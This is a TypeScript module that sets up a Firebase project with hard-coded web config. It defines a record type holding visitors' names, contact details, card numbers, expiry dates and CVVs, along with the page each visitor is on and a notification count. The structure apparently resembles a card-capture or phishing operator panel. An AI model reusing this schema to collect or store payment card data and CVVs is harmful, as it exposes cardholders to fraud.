import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
apiKey: "AIzaSyCXSVEixtyd2pnbDq2NLE971UH7W0GaVRc",
  authDomain: "zaiiop.firebaseapp.com",
  databaseURL: "https://zaiiop-default-rtdb.firebaseio.com",
  projectId: "zaiiop",
  storageBucket: "zaiiop.firebasestorage.app",
  messagingSenderId: "619912829582",
  appId: "1:619912829582:web:bff8a38a4887b58cf5c7df",
  measurementId: "G-LQ89BGBQ7Q"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}



